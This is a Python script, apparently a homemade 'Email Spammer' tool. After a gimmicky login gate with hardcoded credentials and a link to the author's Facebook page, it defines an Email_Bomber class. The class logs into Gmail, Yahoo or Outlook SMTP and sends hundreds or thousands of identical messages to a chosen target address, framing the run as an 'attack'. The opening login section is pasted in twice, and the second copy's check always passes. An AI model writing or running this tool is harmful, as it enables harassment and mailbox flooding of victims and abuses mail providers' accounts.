'''imports'''
import smtplib
import sys
from time import sleep
from tqdm import tqdm, trange
import time
import webbrowser

class half:
	YELLOW = '\033[93m'
	GREEN = '\033[92m'
	BLUE = '\033[96m'
	PINK = '\033[95m'
	RED  = '\033[91m'

class boboy():
	def __init__(self, email, password, facebook_id):  #victim, user):
		self.email = email
		self.password = password
		self.facebook_id = facebook_id
		#self.victim = victim
		#self.user = user

while True:
	k = boboy ("half", "half123","100028341242720")
	e = input (half.BLUE+"\n  Enter Emaill : ")
	if e == (k.email):
		sleep(.75)
		p = input ("  Enter Password : ")
		if p == (k.password):
			sleep(.75)
			print ("\n  To continue, You need to have Mr.Half facebook ID\n")
			sleep(.10)
			print("  OPTION")
			sleep(.10)
			print("\n  1] GET ID")
			sleep(.10)
			print("  2] If you already have Mr.Half's facebook ID")
			sleep(1)
			x = input("\n  Enter OPTION : ")
			if x == ('1'):
				x == webbrowser.open("https://www.facebook.com/COPY.PA.MORE.IIII.MR.HALF.IIII")
			if x == ('2'):
				print("  Please Wait...\n")
				sleep(2)
			i = input ("  Emter ID : ")
			if i == (k.facebook_id):
					sleep(1)
					print("\n  Login Successful...\n")
					break

	else:
		x = input("\n  EXIT")
		if x == (""):
			break


print("""\n	▒█▀▀▀ █▀▄▀█ █▀▀█ ░▀░ █░░ 
	▒█▀▀▀ █░▀░█ █▄▄█ ▀█▀ █░░ 
	▒█▄▄▄ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀ 
	
	▒█▀▀▀█ █▀▀█ █▀▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀▀█ 
	░▀▀▀▄▄ █░░█ █▄▄█ █░▀░█ █░▀░█ █▀▀ █▄▄▀ 
	▒█▄▄▄█ █▀▀▀ ▀░░▀ ▀░░░▀ ▀░░░▀ ▀▀▀ ▀░▀▀\n""")
	
'''imports'''
import smtplib
import sys
from time import sleep

class half:
	YELLOW = '\033[93m'
	GREEN = '\033[92m'
	BLUE = '\033[96m'
	PINK = '\033[95m'
	RED  = '\033[91m'
while True:
	x = "half"
	y = "half123"
	k = input("\n Enter Email : ")
	h = input(" Enter Passwird : ")
	if x == (x):
		break
	elif y == (y):
		break
else:
	print("haha")

print("""\n▒█▀▀▀ █▀▄▀█ █▀▀█ ░▀░ █░░ 
▒█▀▀▀ █░▀░█ █▄▄█ ▀█▀ █░░ 
▒█▄▄▄ ▀░░░▀ ▀░░▀ ▀▀▀ ▀▀▀ 

▒█▀▀▀█ █▀▀█ █▀▀█ █▀▄▀█ █▀▄▀█ █▀▀ █▀▀█ 
░▀▀▀▄▄ █░░█ █▄▄█ █░▀░█ █░▀░█ █▀▀ █▄▄▀ 
▒█▄▄▄█ █▀▀▀ ▀░░▀ ▀░░░▀ ▀░░░▀ ▀▀▀ ▀░▀▀\n""")

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            self.target = str(input(half.GREEN + ' Enter target email : '))
            print(" Target : "+ self.target)
            print('\n Option')
            sleep(.10)
            print(' 1] 1000')
            sleep(.10)
            print(' 2] 500')
            sleep(.10)
            print(' 3] 250')
            sleep(.10)
            print(' 4] Custom')
            sleep(1)
            
            self.mode = int(input(half.GREEN + '\nEnter Option : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(half.GREEN + ' Entet Amount : '))
            print(half.RED + f'\n [ {self.mode} ] {self.amount} emails ')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print('Option')
            sleep(.10)
            print(' 1] Gmail')
            sleep(.10)
            print(' 2] Yahoo')
            sleep(.10)
            print(' 3] Outlook')
            self.server = str(input(half.GREEN + 'Enter Option : '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(half.GREEN + 'Enter port number : '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(half.GREEN + ' Enter Your Email : '))
            self.fromPwd = str(input(half.GREEN + 'Enter Your Password : '))
            self.subject = str(input(half.GREEN + 'Enter Subject : '))
            self.message = str(input(half.GREEN + 'Enter Message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(half.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(half.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(half.RED + '\n+[+[+[ Attack finished ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
